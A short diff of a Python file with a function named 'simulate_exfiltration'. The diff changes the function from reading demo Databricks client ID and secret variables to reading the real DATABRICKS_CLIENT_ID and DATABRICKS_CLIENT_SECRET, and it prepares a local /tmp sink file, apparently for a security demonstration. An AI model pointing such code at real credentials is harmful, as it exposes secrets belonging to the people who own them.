@@ -56,8 +56,8 @@ def send_hello_email(payload):
 
 
 def simulate_exfiltration():
-    client_id = os.getenv("DEMO_DATABRICKS_CLIENT_ID", "")
-    client_secret = os.getenv("DEMO_DATABRICKS_CLIENT_SECRET", "")
+    client_id = os.getenv("DATABRICKS_CLIENT_ID", "")
+    client_secret = os.getenv("DATABRICKS_CLIENT_SECRET", "")
     sink_path = Path(os.getenv("DEMO_EXFIL_SINK", "/tmp/databricks-demo-exfil.log"))
     sink_path.parent.mkdir(parents=True, exist_ok=True)
 
